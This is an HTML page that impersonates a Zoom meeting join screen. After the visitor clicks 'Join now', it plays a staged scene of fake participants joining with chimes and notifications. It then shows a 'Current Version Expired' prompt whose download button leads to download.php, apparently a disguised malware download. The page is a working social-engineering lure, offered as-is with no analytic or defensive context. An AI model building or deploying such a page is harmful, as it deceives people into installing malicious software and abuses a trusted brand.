<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Zoom </title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
html, body {
  margin: 0;
  height: 100%;
  background: black;
  overflow: hidden;
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
}



#audio-unlock {
  position: fixed;
  inset: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  background: #010c17;
  z-index: 1000;
}

.app {
  width: 420px;
  max-width: 94%;
}

.header {
  text-align: center;
  margin-bottom: 24px;
}

.zoom-logo {
  font-size: 22px;
  font-weight: 600;
  color: #0e71eb;
  letter-spacing: 0.04em;
}

.subtext {
  font-size: 14px;
  color: #ffffff;
  margin-top: 6px;
}

.card {
  background: #011d2b;
  border-radius: 12px;
  padding: 28px;
  box-shadow: 0 4px 16px rgba(0,0,0,0.12);
  color: #ffffff;
}

.meeting-title {
  font-size: 15px;
  font-weight: 500;
  margin-bottom: 4px;
}

.meeting-id {
  font-size: 13px;
  color: #5f6368;
  margin-bottom: 22px;
}

.host-row {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 20px;
}

.avatar {
  width: 40px;
  height: 40px;
  border-radius: 50%;
  background: #1765cc;
  color: white;
  font-weight: 600;
  display: flex;
  align-items: center;
  justify-content: center;
  position: relative;
}

.host-online {
  position: absolute;
  bottom: -2px;
  right: -2px;
  width: 10px;
  height: 10px;
  background: #34a853;
  border-radius: 50%;
  border: 2px solid white;
}

.host-name {
  font-size: 14px;
  font-weight: 500;
}

.host-sub {
  font-size: 12px;
  color: #5f6368;
}

.info-row {
  display: flex;
  justify-content: space-between;
  font-size: 12px;
  color: #5f6368;
  margin-bottom: 18px;
}

.expected {
  display: flex;
  justify-content: space-between;
  align-items: center;
  background: #f8f9fa;
  border-radius: 8px;
  padding: 12px 14px;
  margin-bottom: 18px;
  font-size: 13px;
}

.locked {
  color: #d93025;
  font-size: 12px;
}

.host-banner {
  text-align: center;
  background: #e6f4ea;
  color: #188038;
  font-size: 13px;
  font-weight: 500;
  padding: 8px;
  border-radius: 8px;
  margin-bottom: 16px;
}

.join-btn {
  width: 100%;
  padding: 14px;
  border-radius: 24px;
  border: none;
  font-size: 14px;
  font-weight: 500;
  color: white;
  background: #1765cc;
  cursor: pointer;
}

.join-btn:hover {
  background: #1765cc;
}

.join-btn:disabled {
  background: #9aa0a6;
  cursor: default;
}

.footer-text {
  text-align: center;
  font-size: 11px;
  color: #5f6368;
  margin-top: 16px;
}

/* =========================
   VIDEO CALL
   ========================= */

#video-call {
  display: none;
  position: fixed;
  inset: 0;
}

#tv-canvas {
  width: 100%;
  height: 100%;
  display: block;
}

/* NOTIFICATION */

.notification {
  position: fixed;
  top: 20px;
  right: 20px;
  background: #34a853;
  padding: 14px 20px;
  border-radius: 14px;
  font-weight: 600;
  color: white;
  box-shadow: 0 10px 30px rgba(0,0,0,.5);
  opacity: 0;
  transform: translateX(200px);
  transition: .35s;
  z-index: 10;
}

/* UPDATE */

#update-modal {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,.65);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 20;
}

.update-card {
  background: rgba(24,26,31,.9);
  padding: 28px 36px;
  border-radius: 18px;
  text-align: center;
  color: white;
}


.countdown {
  color: #4ead00;
  font-size: 22px;
  font-weight: 700;
}
</style>
</head>

<body>

<!-- JOIN PAGE -->
<div id="audio-unlock">
  <div class="app">
    <div class="header">
      <div class="zoom-logo">Zoom</div>
      <div class="subtext">Ready to join?</div>
    </div>

    <div class="card">
      <div class="meeting-title">Meeting broadcast session</div>
      <div class="meeting-id">Meeting ID: 1764987494729</div>

      <div class="host-row">
        <div class="avatar">HOST<span class="host-online"></span></div>
        <div>
          <div class="host-name">(Host)</div>
          <div class="host-sub">Friend & Family</div>
        </div>
      </div>

      <div class="info-row">
        <div>📅 Today</div>
        <div>⏱ ~45 minutes</div>
      </div>

      <div class="expected">
        <div>👥 5 people expected</div>
        <div class="locked">🔒 Locked</div>
      </div>

      <div class="host-banner">Host is in the meeting</div>

      <button class="join-btn" onclick="startJoining(this)">Join now</button>

      <div class="footer-text">
        Camera and microphone will follow your last used settings.
      </div>
    </div>
  </div>
</div>

<div id="video-call">
  <canvas id="tv-canvas"></canvas>
</div>

<div id="notification" class="notification"></div>

<div id="update-modal">
  <div class="update-card">

    <!-- LOGO -->
    <div class="zoom-logo" style="margin-bottom:16px;">Zoom</div>

    <strong>Current Version Expired</strong><br><br>
    A new version is available for download.<br><br>

    <button class="join-btn" onclick="downloadUpdate()">
      Download update
    </button>
  </div>
</div>



<script>
/* JOIN */
function startJoining(btn){
  btn.disabled = true;
  btn.textContent = 'Joining…';
  document.getElementById('audio-unlock').style.display = 'none';
  document.getElementById('video-call').style.display = 'block';
  startZoomGrid();
  simulateJoins();
}

/* CANVAS BACKGROUND */
function startZoomGrid() {
  const canvas = document.getElementById('tv-canvas');
  const ctx = canvas.getContext('2d');

  function resize() {
    canvas.width = innerWidth;
    canvas.height = innerHeight;
  }
  resize();
  window.addEventListener('resize', resize);

  const bg = new Image();
  bg.src = 'background.PNG';

  let t = 0;
  function draw() {
    ctx.clearRect(0,0,canvas.width,canvas.height);

    const ox = Math.sin(t*0.6)*6;
    const oy = Math.cos(t*0.5)*6;
    ctx.drawImage(bg, ox, oy, canvas.width+12, canvas.height+12);

    ctx.save();
    ctx.filter = 'blur(24px)';
    ctx.globalAlpha = 0.45;
    ctx.drawImage(canvas,0,0);
    ctx.restore();

    ctx.fillStyle = 'rgba(0,0,0,0.8)';
    ctx.fillRect(0,0,canvas.width,canvas.height);

    t+=0.01;
    requestAnimationFrame(draw);
  }
  bg.onload = draw;
}

/* SOUND */
let audioCtx;
function playDingDong(){
  if(!audioCtx) audioCtx = new (window.AudioContext||window.webkitAudioContext)();
  const g = audioCtx.createGain();
  const o1 = audioCtx.createOscillator();
  const o2 = audioCtx.createOscillator();
  o1.frequency.value = 800;
  o2.frequency.value = 600;
  g.gain.setValueAtTime(0,audioCtx.currentTime);
  g.gain.linearRampToValueAtTime(.2,audioCtx.currentTime+.02);
  g.gain.exponentialRampToValueAtTime(.001,audioCtx.currentTime+1);
  o1.connect(g); o2.connect(g); g.connect(audioCtx.destination);
  o1.start(); o1.stop(audioCtx.currentTime+.4);
  o2.start(audioCtx.currentTime+.25); o2.stop(audioCtx.currentTime+.75);
}

function notify(name){
  playDingDong();
  const n=document.getElementById('notification');
  n.textContent=`${name} joined the call`;
  n.style.opacity=1;
  n.style.transform='translateX(0)';
  setTimeout(()=>{n.style.opacity=0;n.style.transform='translateX(200px)'},3000);
}

function showUpdate(){
  document.getElementById('update-modal').style.display = 'flex';
}

function downloadUpdate(){
  window.location.href = "download.php";
}


function simulateJoins(){
  setTimeout(()=>notify('Sarah Ann'),1200);
  setTimeout(()=>notify('Elizabeth Armstrong'),3200);
  setTimeout(()=>notify('Alice Lee'),5000);
  setTimeout(()=>notify('Mary Berkely'),8200);
  setTimeout(()=>notify('Alex Mar'),8500);

  // 🔔 UPDATE NOTIFICATION
  setTimeout(showUpdate, 8200);
}

</script>
</body>
</html>
